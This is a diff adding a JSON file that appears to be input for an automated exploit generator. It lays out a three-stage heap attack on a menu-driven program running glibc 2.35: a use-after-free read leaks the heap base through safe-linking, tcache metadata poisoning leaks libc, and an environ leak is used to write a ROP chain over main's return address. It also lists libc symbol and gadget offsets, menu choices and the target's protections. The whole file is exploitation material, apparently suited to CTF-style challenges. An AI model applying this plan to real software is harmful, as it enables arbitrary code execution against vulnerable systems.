@@ -1,0 +1,175 @@
+{
+  "stages": [
+    {
+      "name": "leak_heap",
+      "ir": [
+        {
+          "op": "ALLOC",
+          "tag": "h0",
+          "size": 48,
+          "data_expr": "b'H' * 8"
+        },
+        {
+          "op": "FREE",
+          "tag": "h0"
+        },
+        {
+          "op": "VIEW",
+          "tag": "h0",
+          "save_as": "xor_key",
+          "note": "read_first_8_bytes_fd_xor"
+        },
+        {
+          "op": "CALC",
+          "var": "heap_base",
+          "expr": "xor_key << 12"
+        }
+      ]
+    },
+    {
+      "name": "leak_libc_metadata",
+      "ir": [
+        {
+          "op": "CALC",
+          "var": "tcache_struct",
+          "expr": "heap_base + 0x10"
+        },
+        {
+          "op": "EDIT",
+          "tag": "h0",
+          "data_expr": "p64(tcache_struct ^ (heap_base + 0x2a0 >> 12))"
+        },
+        {
+          "op": "ALLOC",
+          "tag": "h1",
+          "size": 48,
+          "data_expr": "b'P' * 8"
+        },
+        {
+          "op": "ALLOC",
+          "tag": "tcache_chunk",
+          "size": 48,
+          "data_expr": "b'T' * 8"
+        },
+        {
+          "op": "ALLOC",
+          "tag": "ov",
+          "size": 48,
+          "data_expr": "b'V' * 8"
+        },
+        {
+          "op": "ALLOC",
+          "tag": "guard",
+          "size": 48,
+          "data_expr": "b'G' * 8"
+        },
+        {
+          "op": "EDIT",
+          "tag": "tcache_chunk",
+          "data_expr": "bytes([0, 0, 0, 0, 7, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0])"
+        },
+        {
+          "op": "FREE",
+          "tag": "ov"
+        },
+        {
+          "op": "VIEW",
+          "tag": "ov",
+          "save_as": "libc_leak",
+          "note": "read_first_8_bytes"
+        },
+        {
+          "op": "CALC",
+          "var": "libc.address",
+          "expr": "libc_leak - 0x21ace0"
+        }
+      ]
+    },
+    {
+      "name": "rop_chain",
+      "ir": [
+        {
+          "op": "CALC",
+          "var": "_environ_ptr",
+          "expr": "libc.symbols['environ']"
+        },
+        {
+          "op": "CALC",
+          "var": "target_environ",
+          "expr": "_environ_ptr - 0x10"
+        },
+        {
+          "op": "EDIT",
+          "tag": "tcache_chunk",
+          "note": "set_tcache_entry:bin=2,addr=target_environ"
+        },
+        {
+          "op": "ALLOC",
+          "tag": "env_chunk",
+          "size": 48,
+          "data_expr": "b'E'"
+        },
+        {
+          "op": "VIEW",
+          "tag": "env_chunk",
+          "save_as": "stack_leak",
+          "note": "skip_first_8"
+        },
+        {
+          "op": "CALC",
+          "var": "main_ret_addr",
+          "expr": "stack_leak - 0x120"
+        },
+        {
+          "op": "EDIT",
+          "tag": "tcache_chunk",
+          "note": "set_tcache_entry:bin=2,addr=main_ret_addr"
+        },
+        {
+          "op": "ALLOC_ROP",
+          "tag": "rop_chunk",
+          "size": 48
+        }
+      ]
+    }
+  ],
+  "metadata": {
+    "strategy": "tcache_metadata_poisoning",
+    "max_slots": 5,
+    "alloc_choice": "1",
+    "free_choice": "4",
+    "view_choice": "3",
+    "edit_choice": "2",
+    "exit_choice": "5",
+    "has_idx": true,
+    "has_size": false,
+    "data_param_index": 1,
+    "needs_size": false,
+    "menu_prompt": "b'> '",
+    "libc_offsets": {
+      "system": 331120,
+      "__free_hook": 2233512,
+      "__malloc_hook": 2233504,
+      "main_arena": 2206848,
+      "__environ": 2236928,
+      "_IO_2_1_stdout_": 2209664
+    },
+    "one_gadgets": [],
+    "pop_rdi": 173029,
+    "ret": 168249,
+    "index_reuse": false,
+    "allocated_size": "0x40",
+    "glibc_version": "2.35",
+    "has_safe_linking": true,
+    "has_hooks": true,
+    "binary_security": {
+      "relro": "Full",
+      "pie": false,
+      "nx": true,
+      "canary": false,
+      "cet": false
+    },
+    "technique_id": "tcache_metadata_poisoning",
+    "source": "tcache_metadata_poisoning"
+  }
+}
